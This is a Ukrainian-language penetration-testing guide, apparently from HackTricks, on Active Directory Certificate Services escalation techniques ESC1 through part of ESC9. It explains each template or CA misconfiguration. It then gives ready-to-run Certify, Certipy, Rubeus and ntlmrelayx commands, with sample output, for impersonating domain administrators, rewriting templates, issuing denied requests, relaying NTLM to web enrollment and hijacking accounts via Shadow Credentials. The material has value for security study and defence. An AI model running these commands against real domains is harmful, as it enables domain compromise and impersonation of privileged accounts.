# Ескалація домену AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Це короткий огляд розділів про техніки ескалації з таких публікацій:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Неправильно налаштовані шаблони сертифікатів - ESC1

### Пояснення

### Пояснення ESC1: неправильно налаштовані шаблони сертифікатів

- **Enterprise CA надає права на enrolment користувачам із низькими привілеями.**
- **Затвердження менеджера не потрібне.**
- **Підписи уповноважених осіб не потрібні.**
- **Дескриптори безпеки шаблонів сертифікатів мають надто широкі дозволи, що дає користувачам із низькими привілеями права на enrolment.**
- **Шаблони сертифікатів налаштовані на визначення EKU, які спрощують автентифікацію:**
- Додаються ідентифікатори Extended Key Usage (EKU), як-от Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) або відсутність EKU (SubCA).
- **Шаблон дозволяє запитувачам додавати subjectAltName до Certificate Signing Request (CSR):**
- Active Directory (AD) надає пріоритет subjectAltName (SAN) у сертифікаті під час перевірки ідентичності, якщо він присутній. Це означає, що, вказавши SAN у CSR, можна запросити сертифікат для impersonation будь-якого користувача (наприклад, domain administrator). Можливість указання SAN запитувачем визначається в об'єкті AD шаблону сертифіката через властивість `mspki-certificate-name-flag`. Ця властивість є бітовою маскою, і наявність прапорця `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` дозволяє запитувачу вказувати SAN.

> [!CAUTION]
> Описана конфігурація дозволяє користувачам із низькими привілеями запитувати сертифікати з довільним SAN, що дає змогу автентифікуватися як будь-який domain principal через Kerberos або SChannel.

Цю функцію іноді вмикають для підтримки динамічного створення HTTPS- або host-сертифікатів продуктами чи службами розгортання або через недостатнє розуміння.

Зазначається, що створення сертифіката з цією опцією спричиняє попередження. Цього не відбувається, коли наявний шаблон сертифіката (наприклад, шаблон `WebServer`, у якому ввімкнено `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) дублюють, а потім змінюють, додаючи OID для автентифікації.

### Зловживання

Щоб **знайти вразливі шаблони сертифікатів**, можна виконати:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Щоб **зловживати цією вразливістю для видавання себе за адміністратора**, можна виконати:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Потім ви можете перетворити згенерований **сертифікат у формат `.pfx`** і знову використати його для **автентифікації за допомогою Rubeus або certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Бінарні файли Windows "Certreq.exe" і "Certutil.exe" можна використовувати для створення PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Перелік шаблонів сертифікатів у схемі конфігурації AD Forest, зокрема тих, що не потребують схвалення або підписів, мають EKU Client Authentication або Smart Card Logon і для яких увімкнено прапорець `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, можна виконати за допомогою такого LDAP-запиту:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Неправильно налаштовані шаблони сертифікатів - ESC2

### Пояснення

Другий сценарій зловживання є варіацією першого:

1. Права на реєстрацію надаються користувачам із низькими привілеями Enterprise CA.
2. Вимогу щодо затвердження менеджером вимкнено.
3. Необхідність авторизованих підписів не передбачено.
4. Надто дозвільний дескриптор безпеки шаблону сертифіката надає користувачам із низькими привілеями права на реєстрацію сертифікатів.
5. **Шаблон сертифіката визначено так, щоб він містив Any Purpose EKU або не містив EKU.**

**Any Purpose EKU** дає змогу зловмиснику отримати сертифікат для **будь-якої мети**, зокрема для автентифікації клієнта, автентифікації сервера, підпису коду тощо. Для експлуатації цього сценарію можна застосувати ту саму **техніку, що й для ESC3**.

Сертифікати **без EKU**, які діють як сертифікати підпорядкованого CA, можна експлуатувати **для будь-якої мети**, а **також використовувати для підпису нових сертифікатів**. Отже, зловмисник може вказати довільні EKU або поля в нових сертифікатах, використовуючи сертифікат підпорядкованого CA.

Однак нові сертифікати, створені для **автентифікації домену**, не працюватимуть, якщо підпорядкований CA не є довіреним об’єктом **`NTAuthCertificates`**, що є стандартним налаштуванням. Водночас зловмисник усе ще може створювати **нові сертифікати з будь-яким EKU** та довільними значеннями сертифіката. Потенційно їх можна **використовувати зловмисно** для широкого спектра цілей (наприклад, підпису коду, автентифікації сервера тощо), і це може мати значні наслідки для інших застосунків у мережі, таких як SAML, AD FS або IPSec.

Щоб перелічити шаблони, які відповідають цьому сценарію в схемі конфігурації AD Forest, можна виконати наведений нижче LDAP-запит:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Неправильно налаштовані шаблони Enrollment Agent - ESC3

### Пояснення

Цей сценарій подібний до першого та другого, але **зловживає** **іншим EKU** (Certificate Request Agent) і **2 різними шаблонами** (тому він має 2 набори вимог),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), відомий у документації Microsoft як **Enrollment Agent**, дозволяє суб'єкту **отримати** **сертифікат** **від імені іншого користувача**.

**«Enrollment agent»** отримує такий **шаблон** і використовує отриманий **сертифікат для спільного підпису CSR від імені іншого користувача**. Потім він **надсилає** **спільно підписаний CSR** до CA, отримуючи сертифікат за **шаблоном**, який **дозволяє «отримання від імені іншого користувача»**, а CA повертає **сертифікат, що належить «іншому» користувачу**.

**Вимоги 1:**

- Enterprise CA надає користувачам із низькими привілеями права на отримання сертифікатів.
- Вимогу щодо схвалення менеджером не встановлено.
- Вимогу щодо авторизованих підписів не встановлено.
- Дескриптор безпеки шаблону сертифіката має надмірно широкі дозволи та надає користувачам із низькими привілеями права на отримання сертифікатів.
- Шаблон сертифіката містить Certificate Request Agent EKU, що дозволяє запитувати інші шаблони сертифікатів від імені інших суб'єктів.

**Вимоги 2:**

- Enterprise CA надає користувачам із низькими привілеями права на отримання сертифікатів.
- Схвалення менеджером обходиться.
- Версія схеми шаблону дорівнює 1 або перевищує 2, а також у ньому вказано вимогу Application Policy Issuance Requirement, яка потребує Certificate Request Agent EKU.
- EKU, визначений у шаблоні сертифіката, дозволяє автентифікацію в домені.
- На CA не застосовуються обмеження для enrollment agents.

### Експлуатація

Для exploitation цього сценарію можна використовувати [**Certify**](https://github.com/GhostPack/Certify) або [**Certipy**](https://github.com/ly4k/Certipy):
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Керувати **користувачами**, яким дозволено **отримувати** **сертифікат enrollment agent**, шаблонами, у яких **agents** можуть виконувати enrollment, і **обліковими записами**, від імені яких enrollment agent може діяти, можна за допомогою enterprise CA. Це робиться шляхом відкриття **оснастки** `certsrc.msc`, **клацання правою кнопкою миші на CA**, **натискання Properties**, а потім **переходу** на вкладку “Enrollment Agents”.

Однак зазначається, що **типовим** параметром для CA є “**Do not restrict enrollment agents**.” Коли адміністратори вмикають обмеження для enrollment agents, встановлюючи параметр “Restrict enrollment agents”, типова конфігурація все одно залишається надзвичайно permissive. Вона дозволяє **Everyone** виконувати enrollment у всіх шаблонах від імені будь-кого.

## Вразливий контроль доступу до шаблонів сертифікатів - ESC4

### **Пояснення**

**Дескриптор безпеки** на **шаблонах сертифікатів** визначає **дозволи**, які конкретні **AD principals** мають щодо шаблону.

Якщо **attacker** має необхідні **дозволи**, щоб **змінити** **шаблон** і **впровадити** будь-які **exploitable misconfigurations**, описані у **попередніх розділах**, це може сприяти escalation of privileges.

До важливих дозволів, застосовних до шаблонів сертифікатів, належать:

- **Owner:** Надає неявний контроль над об’єктом, дозволяючи змінювати будь-які атрибути.
- **FullControl:** Надає повні повноваження над об’єктом, зокрема можливість змінювати будь-які атрибути.
- **WriteOwner:** Дозволяє змінити власника об’єкта на principal під контролем attacker.
- **WriteDacl:** Дозволяє змінювати засоби контролю доступу, потенційно надаючи attacker FullControl.
- **WriteProperty:** Дозволяє редагувати будь-які властивості об’єкта.

### Abuse

Щоб визначити principals із правами редагування шаблонів та інших об’єктів PKI, виконайте enumeration за допомогою Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Приклад privesc, як і попередній:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 — це ситуація, коли користувач має права на запис до шаблону сертифіката. Наприклад, цим можна скористатися, щоб перезаписати конфігурацію шаблону сертифіката й зробити його вразливим до ESC1.

Як видно на наведеному вище шляху, лише `JOHNPC` має ці привілеї, але наш користувач `JOHN` отримав нове ребро `AddKeyCredentialLink` до `JOHNPC`. Оскільки ця техніка пов’язана із сертифікатами, я також реалізував цю атаку, яка відома як [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Ось невеликий попередній огляд команди `shadow auto` у Certipy для отримання NT-хеша жертви.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** може перезаписати конфігурацію шаблону сертифіката однією командою. **За замовчуванням** Certipy **перезапише** конфігурацію, щоб зробити її **вразливою до ESC1**. Ми також можемо вказати **параметр `-save-old`, щоб зберегти стару конфігурацію**, що буде корисно для **відновлення** конфігурації після нашої атаки.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Вразливий контроль доступу до об’єктів PKI - ESC5

### Пояснення

Розгалужена мережа взаємопов’язаних відносин на основі ACL, яка охоплює кілька об’єктів, окрім шаблонів сертифікатів і центру сертифікації, може впливати на безпеку всієї системи AD CS. До цих об’єктів, які можуть суттєво впливати на безпеку, належать:

- Об’єкт комп’ютера AD сервера CA, який може бути скомпрометований за допомогою таких механізмів, як S4U2Self або S4U2Proxy.
- RPC/DCOM сервер сервера CA.
- Будь-який дочірній об’єкт AD або контейнер у межах конкретного шляху контейнера `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Цей шлях включає, серед іншого, такі контейнери й об’єкти, як контейнер Certificate Templates, контейнер Certification Authorities, об’єкт NTAuthCertificates і Enrollment Services Container.

Безпека системи PKI може бути скомпрометована, якщо зловмиснику з низькими привілеями вдасться отримати контроль над будь-яким із цих критично важливих компонентів.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Пояснення

Тема, розглянута в [**публікації CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), також стосується наслідків використання прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, описаних Microsoft. Якщо цю конфігурацію активовано на Certification Authority (CA), вона дозволяє додавати **значення, визначені користувачем**, до **альтернативного імені суб’єкта** для **будь-якого запиту**, зокрема для запитів, сформованих з Active Directory®. Отже, ця можливість дозволяє **зловмиснику** виконати enrollment через **будь-який шаблон**, налаштований для **автентифікації** домену, зокрема через ті, що відкриті для enrollment **непривілейованим** користувачам, як-от стандартний шаблон User. У результаті можна отримати сертифікат, який дасть змогу зловмиснику автентифікуватися як адміністратор домену або **будь-яка інша активна сутність** у домені.

**Примітка**: Спосіб додавання **альтернативних імен** до Certificate Signing Request (CSR) за допомогою аргументу `-attrib "SAN:"` у `certreq.exe` (так звані “Name Value Pairs”) відрізняється від стратегії експлуатації SAN в ESC1. Відмінність полягає в **способі інкапсуляції інформації про обліковий запис** — у атрибуті сертифіката, а не в розширенні.

### Експлуатація

Щоб перевірити, чи активовано це налаштування, організації можуть використати наведену нижче команду з `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ця операція фактично використовує **віддалений доступ до реєстру**, тому альтернативним підходом може бути:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Такі інструменти, як [**Certify**](https://github.com/GhostPack/Certify) і [**Certipy**](https://github.com/ly4k/Certipy), здатні виявляти цю неправильну конфігурацію та експлуатувати її:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Щоб змінити ці налаштування, за умови наявності **прав адміністратора домену** або еквівалентних прав, наведену нижче команду можна виконати з будь-якої робочої станції:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Щоб вимкнути цю конфігурацію у вашому середовищі, прапорець можна видалити за допомогою:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Після оновлень безпеки від травня 2022 року нові **сертифікати** міститимуть **розширення безпеки**, яке включає властивість `objectSid` **запитувача**. Для ESC1 цей SID визначається із зазначеного SAN. Однак для **ESC6** SID відповідає `objectSid` **запитувача**, а не SAN.\
> Для експлуатації ESC6 необхідно, щоб система була вразливою до ESC10 (Weak Certificate Mappings), який надає пріоритет **SAN над новим розширенням безпеки**.

## Уразливий контроль доступу до центру сертифікації - ESC7

### Атака 1

#### Пояснення

Контроль доступу до центру сертифікації здійснюється за допомогою набору дозволів, які регулюють дії CA. Ці дозволи можна переглянути, відкривши `certsrv.msc`, клацнувши правою кнопкою миші потрібний CA, вибравши властивості та перейшовши на вкладку Security. Крім того, дозволи можна перелічити за допомогою модуля PSPKI такими командами:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Це надає відомості про основні права, а саме **`ManageCA`** і **`ManageCertificates`**, що відповідають ролям «адміністратор CA» і «Certificate Manager» відповідно.

#### Зловживання

Наявність прав **`ManageCA`** на certificate authority дає principal змогу віддалено змінювати налаштування за допомогою PSPKI. Це включає активацію прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, щоб дозволити вказування SAN у будь-якому template, що є критично важливим аспектом domain escalation.

Спростити цей процес можна за допомогою cmdlet **Enable-PolicyModuleFlag** у PSPKI, який дає змогу вносити зміни без безпосередньої взаємодії з GUI.

Наявність прав **`ManageCertificates`** дає змогу схвалювати заявки, що очікують на розгляд, фактично обходячи захист «схвалення certificate manager для сертифіката CA».

Комбінацію модулів **Certify** і **PSPKI** можна використати для запиту, схвалення та завантаження сертифіката:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Пояснення

> [!WARNING]
> У **попередній атаці** дозволи **`Manage CA`** використовувалися для **увімкнення** прапорця **EDITF_ATTRIBUTESUBJECTALTNAME2** з метою виконання **атаки ESC6**, але це не матиме жодного ефекту, доки службу CA (`CertSvc`) не буде перезапущено. Коли користувач має право доступу `Manage CA`, йому також дозволено **перезапускати службу**. Однак це **не означає, що користувач може віддалено перезапустити службу**. Крім того, **ESC6 може не працювати одразу** у більшості середовищ зі встановленими оновленнями через оновлення системи безпеки за травень 2022 року.

Тому тут представлено іншу атаку.

Передумови:

- Лише дозвіл **`ManageCA`**
- Дозвіл **`Manage Certificates`** (можна надати з **`ManageCA`**)
- Шаблон сертифіката **`SubCA`** має бути **увімкнений** (його можна увімкнути з **`ManageCA`**)

Техніка ґрунтується на тому, що користувачі з правами доступу `Manage CA` _і_ `Manage Certificates` можуть **видавати невдалі запити на сертифікати**. Шаблон сертифіката **`SubCA`** **вразливий до ESC1**, але зареєструватися в цьому шаблоні можуть **лише адміністратори**. Таким чином, **користувач** може **надіслати запит** на реєстрацію в **`SubCA`** — який буде **відхилено**, — але потім його видасть менеджер.

#### Зловживання

Ви можете **надати собі право доступу `Manage Certificates`**, додавши свого користувача як нового відповідального.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Шаблон **`SubCA`** може бути **увімкнений на CA** за допомогою параметра `-enable-template`. За замовчуванням шаблон `SubCA` увімкнений.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Якщо ми виконали попередні умови для цієї атаки, можемо почати з **запиту сертифіката на основі шаблону `SubCA`**.

**Цей запит буде відхилено**, але ми збережемо приватний ключ і запишемо ідентифікатор запиту.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Маючи **`Manage CA` та `Manage Certificates`**, ми можемо видати **невдалий запит на сертифікат** за допомогою команди `ca` і параметра `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
І нарешті, ми можемо **отримати виданий сертифікат** за допомогою команди `req` і параметра `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Abuse of the Manage Certificates Extension (SetExtension)

#### Пояснення

На додаток до класичних способів abuse ESC7 (увімкнення атрибутів EDITF або схвалення запитів, що очікують), **Certify 2.0** виявив абсолютно новий primitive, для якого потрібна лише роль *Manage Certificates* (також відома як **Certificate Manager / Officer**) в Enterprise CA.

Метод RPC `ICertAdmin::SetExtension` може виконуватися будь-яким principal, який має *Manage Certificates*. Хоча цей метод традиційно використовувався легітимними CA для оновлення extensions у запитах, що **очікують**, attacker може зловживати ним, щоб **додати *нестандартне* certificate extension** (наприклад, власний OID *Certificate Issuance Policy*, такий як `1.1.1.1`) до запиту, що очікує схвалення.

Оскільки цільовий template **не визначає значення за замовчуванням для цього extension**, CA **НЕ** перезапише контрольоване attacker значення, коли запит зрештою буде видано. Отриманий certificate тому міститиме extension, вибране attacker, яке може:

* Виконати вимоги Application / Issuance Policy інших вразливих templates (що призведе до privilege escalation).
* Додати додаткові EKUs або policies, які нададуть certificate неочікуваний рівень довіри в сторонніх системах.

Коротко, *Manage Certificates* — раніше вважалася «менш потужною» частиною ESC7 — тепер може використовуватися для повного privilege escalation або довготривалої persistence без зміни конфігурації CA та без необхідності мати більш обмежене право *Manage CA*.

#### Abuse primitive за допомогою Certify 2.0

1. **Надішліть certificate request, який залишиться *в очікуванні*.** Це можна забезпечити за допомогою template, що вимагає схвалення manager:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Додайте custom extension до запиту, що очікує**, використовуючи нову команду `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Якщо template уже не визначає extension *Certificate Issuance Policies*, наведене вище значення буде збережене після видачі.*

3. **Видайте запит** (якщо ваша роль також має права на схвалення *Manage Certificates*) або дочекайтеся, поки його схвалить operator. Після видачі завантажте certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Отриманий certificate тепер містить шкідливий issuance-policy OID і може використовуватися в подальших атаках (наприклад, ESC13, domain escalation тощо).

> NOTE:  Ту саму атаку можна виконати за допомогою Certipy ≥ 4.7 через команду `ca` і параметр `-set-extension`.

## NTLM Relay до HTTP Endpoints AD CS – ESC8

### Пояснення

> [!TIP]
> У середовищах, де **AD CS встановлено**, якщо існує **вразливий web enrollment endpoint** і опубліковано щонайменше один **certificate template**, який дозволяє **domain computer enrollment і client authentication** (наприклад, стандартний template **`Machine`**), **будь-який computer з активною spooler service може бути скомпрометований attacker**!

AD CS підтримує кілька **HTTP-based enrollment methods**, доступних через додаткові server roles, які можуть встановлювати адміністратори. Ці інтерфейси для HTTP-based certificate enrollment вразливі до **NTLM relay атак**. Attacker зі **скомпрометованої machine може видати себе за будь-який AD account, який автентифікується через inbound NTLM**. Видаючи себе за victim account, attacker може отримати доступ до цих web interfaces і **запросити client authentication certificate за допомогою certificate templates `User` або `Machine`**.

- **Web enrollment interface** (старий ASP application, доступний за адресою `http://<caserver>/certsrv/`) за замовчуванням використовує лише HTTP, який не забезпечує захист від NTLM relay атак. Крім того, він явно дозволяє лише NTLM authentication через свій Authorization HTTP header, через що безпечніші методи authentication, такі як Kerberos, не застосовуються.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service і **Network Device Enrollment Service** (NDES) за замовчуванням підтримують negotiate authentication через свій Authorization HTTP header. Negotiate authentication **підтримує і** Kerberos, **і** **NTLM**, що дозволяє attacker під час relay атак **понизити authentication до NTLM**. Хоча ці web services за замовчуванням використовують HTTPS, самого HTTPS **недостатньо для захисту від NTLM relay атак**. Захист HTTPS services від NTLM relay атак можливий лише тоді, коли HTTPS поєднано з channel binding. На жаль, AD CS не активує Extended Protection for Authentication в IIS, що необхідно для channel binding.

Поширеною **проблемою** NTLM relay атак є **коротка тривалість NTLM sessions** і неможливість attacker взаємодіяти із services, які **вимагають NTLM signing**.

Однак це обмеження долається шляхом використання NTLM relay атаки для отримання certificate користувача, оскільки тривалість session визначається строком дії certificate, а certificate можна використовувати із services, які **вимагають NTLM signing**. Інструкції щодо використання викраденого certificate наведено тут:


{{#ref}}
account-persistence.md
{{#endref}}

Іншим обмеженням NTLM relay атак є те, що **machine під контролем attacker має бути автентифікована victim account**. Attacker може або чекати, або спробувати **примусити** цю authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` перераховує **увімкнені HTTP endpoints AD CS**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Властивість `msPKI-Enrollment-Servers` використовується корпоративними центрами сертифікації (CA) для зберігання кінцевих точок Certificate Enrollment Service (CES). Ці кінцеві точки можна проаналізувати та перелічити за допомогою інструмента **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Зловживання за допомогою Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Зловживання за допомогою [Certipy](https://github.com/ly4k/Certipy)

Запит сертифіката за замовчуванням виконується Certipy на основі шаблону `Machine` або `User`, залежно від того, чи закінчується ім’я облікового запису, автентифікацію якого relay-ять, на `$`. Вказати альтернативний шаблон можна за допомогою параметра `-template`.

Після цього для примусової ініціації автентифікації можна застосувати техніку на кшталт [PetitPotam](https://github.com/ly4k/PetitPotam). Під час роботи з контролерами домену потрібно вказати `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Пояснення

Нове значення **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) для **`msPKI-Enrollment-Flag`**, відоме як ESC9, запобігає вбудовуванню **нового розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`** у сертифікат. Цей прапорець стає важливим, коли **`StrongCertificateBindingEnforcement`** встановлено в `1` (значення за замовчуванням), на відміну від значення `2`. Його важливість зростає у сценаріях, де може бути використано слабше зіставлення сертифіката для Kerberos або Schannel (як у ESC10), оскільки відсутність ESC9 не змінила б вимог.

Умови, за яких встановлення цього прапорця набуває значення:

- `StrongCertificateBindingEnforcement` не встановлено в `2` (значення за замовчуванням — `1`), або `CertificateMappingMethods` містить прапорець `UPN`.
- Сертифікат має прапорець `CT_FLAG_NO_SECURITY_EXTENSION` у налаштуванні `msPKI-Enrollment-Flag`.
- Сертифікат містить будь-який EKU для автентифікації клієнта.
- Над будь-яким обліковим записом доступні дозволи `GenericWrite`, що дає змогу скомпрометувати інший обліковий запис.

### Сценарій зловживання

Припустімо, що `John@corp.local` має дозволи `GenericWrite` над `Jane@corp.local` і прагне скомпрометувати `Administrator@corp.local`. Шаблон сертифіката `ESC9`, у якому `Jane@corp.local` має право виконувати enrollment, налаштований із прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у параметрі `msPKI-Enrollment-Flag`.

Спочатку хеш `Jane` отримується за допомогою Shadow Credentials завдяки `GenericWrite`, яким володіє `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Згодом `userPrincipalName` користувача `Jane` змінюється на `Administrator`, навмисно без частини домену `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ця модифікація не порушує обмежень, оскільки `Administrator@corp.local` залишається окремим `userPrincipalName` для `Administrator`.

